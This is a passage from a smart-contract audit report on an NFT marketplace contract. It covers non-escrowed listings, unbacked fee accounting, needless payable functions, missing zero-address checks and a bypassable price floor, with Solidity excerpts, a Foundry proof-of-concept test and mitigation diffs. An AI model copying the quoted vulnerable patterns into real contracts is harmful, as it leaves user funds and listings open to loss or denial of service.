The root cause is that `s_listings` uses `tokenId` as its key, so re-listing destroys the previous seller's claim. The fix requires decoupling the listing record from the token ID by keying it on the monotonic `listingsCounter` and preventing re-listing until the previous seller has collected.

In `list()`, store under `listingsCounter` and block re-listing while proceeds are uncollected:

```solidity
+ mapping(uint256 => bool) private s_collected;

function list(uint256 _tokenId, uint32 _price) external onlyWhitelisted {
    require(_price >= MIN_PRICE, "Price must be at least 1 USDC");
    require(ownerOf(_tokenId) == msg.sender, "Not owner of NFT");
    require(s_listings[_tokenId].isActive == false, "NFT is already listed");
+   // Block re-listing if prior sale proceeds have not been collected
+   require(collateralForMinting[_tokenId] == 0 || s_collected[_tokenId], "Prior proceeds uncollected");

    listingsCounter++;
    activeListingsCounter++;

-   s_listings[_tokenId] = Listing({...});
+   s_listings[listingsCounter] = Listing({seller: msg.sender, price: _price, nft: address(this), tokenId: _tokenId, isActive: true});
    emit NFT_Dealers_Listed(msg.sender, listingsCounter);
}
```

Note: fully fixing this requires also resolving H-02 (keying all operations on `listingsCounter` rather than `tokenId`).

## <a id='M-05'></a>M-05. Active listings are not escrowed: sellers can make listings stale

_Submitted by [oxeugenio](https://profiles.cyfrin.io/u/oxeugenio), [etherengineer](https://profiles.cyfrin.io/u/etherengineer), [0xprestonong](https://profiles.cyfrin.io/u/0xprestonong), [fredo182](https://profiles.cyfrin.io/u/fredo182), [mamaz](https://profiles.cyfrin.io/u/mamaz), [0xberzerk](https://profiles.cyfrin.io/u/0xberzerk), [altshar](https://profiles.cyfrin.io/u/altshar), [s3mvl4d](https://profiles.cyfrin.io/u/s3mvl4d). Selected submission by: [s3mvl4d](https://profiles.cyfrin.io/u/s3mvl4d)._      
            


## Description

* Under a normal marketplace design, creating a listing should either escrow the NFT into the marketplace contract or otherwise enforce that the listed asset cannot be transferred away while the listing remains active. That way, when a buyer calls `buy()`, the marketplace can reliably deliver the NFT associated with the active listing.

* The issue is that `list()` only records listing metadata in `s_listings[_tokenId]`, but it does **not** escrow the NFT and does **not** add any transfer restriction while the listing is active. Because the seller continues to own the token directly through the underlying ERC721 implementation, they can transfer it away after listing. Once that happens, the listing still appears active on-chain, but `buy()` later reverts because it tries to `_safeTransfer()` the token from the original seller address stored in the listing rather than from the token’s current owner.

```Solidity
function list(uint256 _tokenId, uint32 _price) external onlyWhitelisted {
    require(_price >= MIN_PRICE, "Price must be at least 1 USDC");
    require(ownerOf(_tokenId) == msg.sender, "Not owner of NFT");
    require(s_listings[_tokenId].isActive == false, "NFT is already listed");
    require(_price > 0, "Price must be greater than 0");

    listingsCounter++;
    activeListingsCounter++;

    // @> only marketplace metadata is stored
    // @> NFT remains in seller custody and is not escrowed
    s_listings[_tokenId] =
        Listing({seller: msg.sender, price: _price, nft: address(this), tokenId: _tokenId, isActive: true});

    emit NFT_Dealers_Listed(msg.sender, listingsCounter);
}

function buy(uint256 _listingId) external payable {
    Listing memory listing = s_listings[_listingId];
    if (!listing.isActive) revert ListingNotActive(_listingId);
    require(listing.seller != msg.sender, "Seller cannot buy their own NFT");

    activeListingsCounter--;
    bool success = usdc.transferFrom(msg.sender, address(this), listing.price);
    require(success, "USDC transfer failed");

    // @> assumes listing.seller still owns the token
    _safeTransfer(listing.seller, msg.sender, listing.tokenId, "");
    s_listings[_listingId].isActive = false;

    emit NFT_Dealers_Sold(msg.sender, listing.price);
}
```

## Risk

**Likelihood**: High

* This occurs whenever a seller lists an NFT and then uses the normal ERC721 `transferFrom` / `safeTransferFrom` path to move the token elsewhere, because nothing in `list()` prevents further transfers by the current owner.

* This occurs during normal marketplace usage because listings are designed to remain in seller custody, so the stale-listing condition can be created without any unusual privileges beyond being the seller.

**Impact**: High

* Buyers can encounter active listings that always revert at purchase time, causing denial of service, wasted gas, and broken marketplace UX.

* The marketplace’s active listing count and on-chain listing state become unreliable because listings can remain active even though the marketplace no longer has a deliverable token associated with them.

## Proof of Concept

* Add **`import {console2} from "forge-std/console2.sol";`** at the top of **`NFTDealersTest.t.sol`**.

* Copy the code below to **`NFTDealersTest`** contract.

* Run command **`forge test --mt testActiveListingsAreNotEscrowedAndCanBecomeStale -vv --via-ir`**.

```Solidity
function testActiveListingsAreNotEscrowedAndCanBecomeStale() public revealed whitelisted {
        uint256 tokenId = 1;
        uint32 listPrice = 1000e6;
        address staleHolder = makeAddr("staleHolder");

        // ------------------------------------------------------------
        // Phase 1: seller mints and lists token #1
        // ------------------------------------------------------------
        mintAndListNFTForTesting(tokenId, listPrice);

        (
            address sellerBeforeTransfer,
            uint32 storedPriceBeforeTransfer,
            address nftBeforeTransfer,
            uint256 storedTokenIdBeforeTransfer,
            bool isActiveBeforeTransfer
        ) = nftDealers.s_listings(tokenId);

        console2.log("Owner before external transfer:", nftDealers.ownerOf(tokenId));
        console2.log("Stored seller before external transfer:", sellerBeforeTransfer);
        console2.log("Stored price before external transfer:", uint256(storedPriceBeforeTransfer));
        console2.log("Stored nft before external transfer:", nftBeforeTransfer);
        console2.log("Stored tokenId before external transfer:", storedTokenIdBeforeTransfer);
        console2.log("Stored active flag before external transfer:", isActiveBeforeTransfer ? uint256(1) : uint256(0));
        console2.log("totalActiveListings before external transfer:", nftDealers.totalActiveListings());

        assertEq(nftDealers.ownerOf(tokenId), userWithCash, "sanity: seller owns token before external transfer");
        assertTrue(isActiveBeforeTransfer, "sanity: listing should be active before external transfer");
        assertEq(nftDealers.totalActiveListings(), 1, "sanity: one active listing before external transfer");

        // ------------------------------------------------------------
        // Phase 2: seller transfers the listed NFT away using plain ERC721 transfer
        // ------------------------------------------------------------
        vm.prank(userWithCash);
        nftDealers.transferFrom(userWithCash, staleHolder, tokenId);

        (
            address sellerAfterTransfer,
            uint32 storedPriceAfterTransfer,
            address nftAfterTransfer,
            uint256 storedTokenIdAfterTransfer,
            bool isActiveAfterTransfer
        ) = nftDealers.s_listings(tokenId);

        console2.log("Owner after external transfer:", nftDealers.ownerOf(tokenId));
        console2.log("Stored seller after external transfer:", sellerAfterTransfer);
        console2.log("Stored price after external transfer:", uint256(storedPriceAfterTransfer));
        console2.log("Stored nft after external transfer:", nftAfterTransfer);
        console2.log("Stored tokenId after external transfer:", storedTokenIdAfterTransfer);
        console2.log("Stored active flag after external transfer:", isActiveAfterTransfer ? uint256(1) : uint256(0));
        console2.log("totalActiveListings after external transfer:", nftDealers.totalActiveListings());

        // Core bug signal:
        // token ownership moved, but the listing is still active and still points to the old seller
        assertEq(nftDealers.ownerOf(tokenId), staleHolder, "token ownership changed outside the marketplace");
        assertEq(sellerAfterTransfer, userWithCash, "listing still points to original seller");
        assertTrue(isActiveAfterTransfer, "BUG: listing remains active after token left seller custody");
        assertEq(nftDealers.totalActiveListings(), 1, "BUG: active listing count still includes stale listing");

        // ------------------------------------------------------------
        // Phase 3: buyer attempts to purchase the stale listing
        // ------------------------------------------------------------
        vm.startPrank(userWithEvenMoreCash);
        usdc.approve(address(nftDealers), listPrice);

        // buy() will attempt _safeTransfer(listing.seller, buyer, tokenId, "")
        // but listing.seller no longer owns the token, so the purchase reverts.
        // Revert with the error ERC721: transfer from incorrect owner,
        // which confirms the root cause is the stale listing pointing to the wrong seller.
        vm.expectRevert();
        nftDealers.buy(tokenId);
        vm.stopPrank();

        (
            address sellerAfterFailedBuy,
            uint32 storedPriceAfterFailedBuy,
            address nftAfterFailedBuy,
            uint256 storedTokenIdAfterFailedBuy,
            bool isActiveAfterFailedBuy
        ) = nftDealers.s_listings(tokenId);

        console2.log("Owner after failed buy:", nftDealers.ownerOf(tokenId));
        console2.log("Stored seller after failed buy:", sellerAfterFailedBuy);
        console2.log("Stored price after failed buy:", uint256(storedPriceAfterFailedBuy));
        console2.log("Stored nft after failed buy:", nftAfterFailedBuy);
        console2.log("Stored tokenId after failed buy:", storedTokenIdAfterFailedBuy);
        console2.log("Stored active flag after failed buy:", isActiveAfterFailedBuy ? uint256(1) : uint256(0));
        console2.log("totalActiveListings after failed buy:", nftDealers.totalActiveListings());

        // The listing is still stale and still active after the failed purchase.
        assertEq(nftDealers.ownerOf(tokenId), staleHolder, "stale holder still owns the token after failed buy");
        assertTrue(isActiveAfterFailedBuy, "BUG: failed buy does not clean up stale active listing");
        assertEq(nftDealers.totalActiveListings(), 1, "BUG: stale listing still counted as active");
    }
```

Output:

```javascript
[⠊] Compiling...
No files changed, compilation skipped

Ran 1 test for test/NFTDealersTest.t.sol:NFTDealersTest
[PASS] testActiveListingsAreNotEscrowedAndCanBecomeStale() (gas: 513003)
Logs:
  Owner before external transfer: 0x22CdC71E987473D657FCe79C9C0C0B1A62148056
  Stored seller before external transfer: 0x22CdC71E987473D657FCe79C9C0C0B1A62148056
  Stored price before external transfer: 1000000000
  Stored nft before external transfer: 0x2e234DAe75C793f67A35089C9d99245E1C58470b
  Stored tokenId before external transfer: 1
  Stored active flag before external transfer: 1
  totalActiveListings before external transfer: 1
  Owner after external transfer: 0x928f16eb8A5F541De90d9aaF9893cEff4F8C0E8e
  Stored seller after external transfer: 0x22CdC71E987473D657FCe79C9C0C0B1A62148056
  Stored price after external transfer: 1000000000
  Stored nft after external transfer: 0x2e234DAe75C793f67A35089C9d99245E1C58470b
  Stored tokenId after external transfer: 1
  Stored active flag after external transfer: 1
  totalActiveListings after external transfer: 1
  Owner after failed buy: 0x928f16eb8A5F541De90d9aaF9893cEff4F8C0E8e
  Stored seller after failed buy: 0x22CdC71E987473D657FCe79C9C0C0B1A62148056
  Stored price after failed buy: 1000000000
  Stored nft after failed buy: 0x2e234DAe75C793f67A35089C9d99245E1C58470b
  Stored tokenId after failed buy: 1
  Stored active flag after failed buy: 1
  totalActiveListings after failed buy: 1

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.72ms (1.12ms CPU time)

Ran 1 test suite in 11.94ms (3.72ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

## Recommended Mitigation

* **Escrow the NFT into the marketplace contract at listing time** and transfer it out only on cancel or successful purchase.

```diff
function list(uint256 _tokenId, uint32 _price) external onlyWhitelisted {
     require(_price >= MIN_PRICE, "Price must be at least 1 USDC");
     require(ownerOf(_tokenId) == msg.sender, "Not owner of NFT");
     require(s_listings[_tokenId].isActive == false, "NFT is already listed");
     require(_price > 0, "Price must be greater than 0");

+    // Escrow the NFT into the marketplace contract
+    _safeTransfer(msg.sender, address(this), _tokenId, "");

     listingsCounter++;
     activeListingsCounter++;
     s_listings[_tokenId] =
         Listing({seller: msg.sender, price: _price, nft: address(this), tokenId: _tokenId, isActive: true});

     emit NFT_Dealers_Listed(msg.sender, listingsCounter);
 }

 function buy(uint256 _listingId) external payable {
     Listing memory listing = s_listings[_listingId];
     if (!listing.isActive) revert ListingNotActive(_listingId);
     require(listing.seller != msg.sender, "Seller cannot buy their own NFT");

     activeListingsCounter--;
     bool success = usdc.transferFrom(msg.sender, address(this), listing.price);
     require(success, "USDC transfer failed");

-    _safeTransfer(listing.seller, msg.sender, listing.tokenId, "");
+    _safeTransfer(address(this), msg.sender, listing.tokenId, "");
     s_listings[_listingId].isActive = false;

     emit NFT_Dealers_Sold(msg.sender, listing.price);
 }

 function cancelListing(uint256 _listingId) external {
     Listing memory listing = s_listings[_listingId];
     if (!listing.isActive) revert ListingNotActive(_listingId);
     require(listing.seller == msg.sender, "Only seller can cancel listing");

     s_listings[_listingId].isActive = false;
     activeListingsCounter--;

+    // Return the NFT from escrow to the seller
+    _safeTransfer(address(this), listing.seller, listing.tokenId, "");
+
     usdc.safeTransfer(listing.seller, collateralForMinting[listing.tokenId]);
     collateralForMinting[listing.tokenId] = 0;

     emit NFT_Dealers_ListingCanceled(_listingId);
 }
```

## <a id='M-06'></a>M-06. Unbacked Fee Accounting

_Submitted by [1chapeuazul](https://profiles.cyfrin.io/u/1chapeuazul), [s3mvl4d](https://profiles.cyfrin.io/u/s3mvl4d). Selected submission by: [1chapeuazul](https://profiles.cyfrin.io/u/1chapeuazul)._      
            


# Unbacked Fee Accounting

## Description

* **Normal behavior**

  The contract collects protocol fees from NFT sales and tracks them using `totalFeesCollected`. These fees are expected to remain available in the contract and be withdrawable by the owner via `withdrawFees()`.

  <br />

* **Issue**

  Fees are only tracked via a storage variable and are not explicitly segregated from the contract’s USDC balance. Seller payouts are executed from the same **shared pool** that includes fees, meaning the contract implicitly relies on perfect balance alignment. Any small reduction in the contract’s balance causes `totalFeesCollected` to exceed actual funds, leading to `withdrawFees()` reverting and permanently\* locking protocol fees.

```Solidity
function collectUsdcFromSelling(
    uint256 _listingId
) external onlySeller(_listingId) {
    Listing memory listing = s_listings[_listingId];
    require(!listing.isActive, "Listing must be inactive to collect USDC");

    uint256 fees = _calculateFees(listing.price);
    uint256 amountToSeller = listing.price - fees;
    uint256 collateralToReturn = collateralForMinting[listing.tokenId];

    totalFeesCollected += fees; // @> Fees are only accounted, not reserved

    amountToSeller += collateralToReturn;

    usdc.safeTransfer(address(this), fees); // @> No-op (self-transfer)
    usdc.safeTransfer(msg.sender, amountToSeller); // @> Pays seller from shared pool
}
```

## Risk

**Likelihood: MEDIUM**

* Occurs when the contract balance deviates slightly from expected accounting due to rounding, integration changes, or unexpected token behavior

* Arises during normal operation as multiple trades and balance movements accumulate over time

**Impact: HIGH**

* `withdrawFees()` can revert permanently\* once fees are not fully backed

* Protocol fees become locked and unclaimable, resulting in direct financial loss

<br />

**Note on “permanent” revert:**

The revert is considered permanent because once `totalFeesCollected` exceeds the contract’s actual token balance, there is no mechanism in the contract to restore consistency between accounting and available funds. The `withdrawFees()` function will continue to attempt transferring the full `totalFeesCollected` amount, which will always exceed the available balance and therefore always revert. Since the contract does not provide any way to reduce `totalFeesCollected` or recover the missing funds, fee withdrawals become indefinitely impossible.

## Recommended Mitigation

Defensive check (fallback)

```diff
function withdrawFees() external onlyOwner {
+   require(
+       usdc.balanceOf(address(this)) >= totalFeesCollected,
+       "Insufficient balance for fees"
+   );
```

Ensure fees are never used to pay sellers.

```diff
  uint256 fees = _calculateFees(listing.price);
+ uint256 sellerAmount = listing.price - fees;

- totalFeesCollected += fees;
- amountToSeller += collateralToReturn;
- usdc.safeTransfer(msg.sender, amountToSeller);

  totalFeesCollected += fees;
- usdc.safeTransfer(address(this), fees); // remove self-transfer (no-op)

+ usdc.safeTransfer(msg.sender, sellerAmount + collateralToReturn);
```


# Low Risk Findings

## <a id='L-01'></a>L-01. [I-1] Payable functions are not supposed to receive Ether

_Submitted by [sum1t_here](https://profiles.cyfrin.io/u/sum1t_here), [eliab256](https://profiles.cyfrin.io/u/eliab256), [l0cu70s](https://profiles.cyfrin.io/u/l0cu70s), [vneseseller](https://profiles.cyfrin.io/u/vneseseller), [raihanmd](https://profiles.cyfrin.io/u/raihanmd), [vanoxt](https://profiles.cyfrin.io/u/vanoxt), [fuzz755](https://profiles.cyfrin.io/u/fuzz755), [yelsnik](https://profiles.cyfrin.io/u/yelsnik), [auditor_nate](https://profiles.cyfrin.io/u/auditor_nate), [0xprestonong](https://profiles.cyfrin.io/u/0xprestonong), [jamie54781](https://profiles.cyfrin.io/u/jamie54781), [chron3o](https://profiles.cyfrin.io/u/chron3o), [comfortnurse021](https://profiles.cyfrin.io/u/comfortnurse021), [nahmstay](https://profiles.cyfrin.io/u/nahmstay), [asssol](https://profiles.cyfrin.io/u/asssol), [0xaljzoli](https://profiles.cyfrin.io/u/0xaljzoli), [verseagent](https://profiles.cyfrin.io/u/verseagent), [jimmychu0807](https://profiles.cyfrin.io/u/jimmychu0807), [belladonna](https://profiles.cyfrin.io/u/belladonna), [ramilmustafin33](https://profiles.cyfrin.io/u/ramilmustafin33), [fredo182](https://profiles.cyfrin.io/u/fredo182), [0xberzerk](https://profiles.cyfrin.io/u/0xberzerk), [altshar](https://profiles.cyfrin.io/u/altshar), [1chapeuazul](https://profiles.cyfrin.io/u/1chapeuazul), [s3mvl4d](https://profiles.cyfrin.io/u/s3mvl4d), [farnad](https://profiles.cyfrin.io/u/farnad), [adcdiii](https://profiles.cyfrin.io/u/adcdiii), [mrn0b0dye](https://profiles.cyfrin.io/u/mrn0b0dye). Selected submission by: [fuzz755](https://profiles.cyfrin.io/u/fuzz755)._      
            


# Payable functions are not supposed to receive Ether

## Description

The 2 functions `mintNft` and `buy` are marked as `payable`, but they are not supposed to receive any Ether. All the payments are processed in USDC. The keyword can be removed to prevent users from sending Ether to the smart contract.

```solidity
@>  function mintNft() external payable onlyWhenRevealed onlyWhitelisted {

@>  function buy(uint256 _listingId) external payable {
```

## Recommended Mitigation

Remove the `payable` keyword:

```diff
-   function mintNft() external payable onlyWhenRevealed onlyWhitelisted {
+   function mintNft() external onlyWhenRevealed onlyWhitelisted {

-   function buy(uint256 _listingId) external payable {
+   function buy(uint256 _listingId) external {
```

## <a id='L-02'></a>L-02. Constructor Does Not Validate Critical Addresses Against `address(0)`

_Submitted by [sum1t_here](https://profiles.cyfrin.io/u/sum1t_here), [chron3o](https://profiles.cyfrin.io/u/chron3o), [0xaljzoli](https://profiles.cyfrin.io/u/0xaljzoli), [maryammasood](https://profiles.cyfrin.io/u/maryammasood), [paranjapeshweta1997](https://profiles.cyfrin.io/u/paranjapeshweta1997), [altshar](https://profiles.cyfrin.io/u/altshar), [kpfgt14](https://profiles.cyfrin.io/u/kpfgt14), [1chapeuazul](https://profiles.cyfrin.io/u/1chapeuazul). Selected submission by: [kpfgt14](https://profiles.cyfrin.io/u/kpfgt14)._      
            


# Constructor Does Not Validate Critical Addresses Against `address(0)`

## Description

The constructor sets critical addresses (`owner` and `usdc`) without validating that inputs are non-zero.

If `_owner` is `address(0)`, owner-only administrative functionality becomes permanently inaccessible. If `_usdc` is `address(0)`, ERC20 interactions (mint/list/buy/settlement flows) are misconfigured and can revert or behave unexpectedly.

```solidity
constructor(
    address _owner,
    address _usdc,
    string memory _collectionName,
    string memory _symbol,
    string memory _collectionImage,
    uint256 _lockAmount
) ERC721(_collectionName, _symbol) {
    owner = _owner;
    usdc = IERC20(_usdc);
    collectionName = _collectionName;
    tokenSymbol = _symbol;
    collectionImage = _collectionImage;
    lockAmount = _lockAmount;
}
```

## Risk

**Likelihood**:

* The issue occurs at deployment time when constructor arguments are supplied.

* Deployment scripts and manual deployments are common sources of parameter mistakes.

**Impact**:

* `owner = address(0)` can permanently lock admin operations (`onlyOwner`).

* `usdc = address(0)` breaks core protocol token flows and can render the system unusable.

## Proof of Concept

1. Deploy with `_owner = address(0)`.
2. Call any `onlyOwner` function (e.g., `revealCollection()`) from a regular account.
3. Call reverts forever because no EOA can satisfy `owner == msg.sender`.

Alternative:

1. Deploy with `_usdc = address(0)`.
2. Call `mintNft()` or `buy()`.
3. ERC20 call path is invalid due to a zero token address, causing core flows to fail.

## Recommended Mitigation

Validate constructor inputs and revert on zero addresses.

```diff
 constructor(
     address _owner,
     address _usdc,
     string memory _collectionName,
     string memory _symbol,
     string memory _collectionImage,
     uint256 _lockAmount
 ) ERC721(_collectionName, _symbol) {
+    if (_owner == address(0) || _usdc == address(0)) revert InvalidAddress();
+
     owner = _owner;
     usdc = IERC20(_usdc);
     collectionName = _collectionName;
     tokenSymbol = _symbol;
     collectionImage = _collectionImage;
     lockAmount = _lockAmount;
 }
```

## <a id='L-03'></a>L-03. `updatePrice()` skips `MIN_PRICE` check — sellers can set price below 1 USDC

_Submitted by [raihanmd](https://profiles.cyfrin.io/u/raihanmd), [primemate](https://profiles.cyfrin.io/u/primemate), [webrainsec](https://profiles.cyfrin.io/u/webrainsec), [symmate](https://profiles.cyfrin.io/u/symmate), [auditor_nate](https://profiles.cyfrin.io/u/auditor_nate), [etherengineer](https://profiles.cyfrin.io/u/etherengineer), [cymans](https://profiles.cyfrin.io/u/cymans), [jamie54781](https://profiles.cyfrin.io/u/jamie54781), [comfortnurse021](https://profiles.cyfrin.io/u/comfortnurse021), [yjl3393980084](https://profiles.cyfrin.io/u/yjl3393980084), [fredo182](https://profiles.cyfrin.io/u/fredo182), [0xziin](https://profiles.cyfrin.io/u/0xziin), [kode_n_rolla](https://profiles.cyfrin.io/u/kode_n_rolla), [jimmychu0807](https://profiles.cyfrin.io/u/jimmychu0807), [belladonna](https://profiles.cyfrin.io/u/belladonna), [s3mvl4d](https://profiles.cyfrin.io/u/s3mvl4d), [adcdiii](https://profiles.cyfrin.io/u/adcdiii), [farnad](https://profiles.cyfrin.io/u/farnad). Selected submission by: [webrainsec](https://profiles.cyfrin.io/u/webrainsec)._      
            


# Root + Impact

## Description

* `list()` enforces `require(_price >= MIN_PRICE)` but `updatePrice()` only checks `_newPrice > 0`. Sellers can bypass the price floor after listing.

```solidity
function updatePrice(uint256 _listingId, uint32 _newPrice) external onlySeller(_listingId) {
    // ...
    require(_newPrice > 0, "Price must be greater than 0");
    // @> missing: require(_newPrice >= MIN_PRICE)
    s_listings[_listingId].price = _newPrice;
}
```

## Risk

**Likelihood**:

* Any seller calls `updatePrice` with a value between 1 and 999,999 (below 1 USDC)

**Impact**:

* Breaks the protocol's price floor invariant. Fee calculations on sub-USDC prices yield near-zero fees

## Proof of Concept

A seller lists at 1 USDC (valid), then calls `updatePrice(tokenId, 1)` setting price to 0.000001 USDC. The `> 0` check passes but `>= MIN_PRICE` is never enforced, breaking the price floor.

## Recommended Mitigation

Apply the same `MIN_PRICE` check used in `list()` to maintain a consistent price floor across both creation and update paths.

```diff
  function updatePrice(uint256 _listingId, uint32 _newPrice) external onlySeller(_listingId) {
      // ...
-     require(_newPrice > 0, "Price must be greater than 0");
+     require(_newPrice >= MIN_PRICE, "Price must be at least 1 USDC");
      s_listings[_listingId].price = _newPrice;
  }
```





    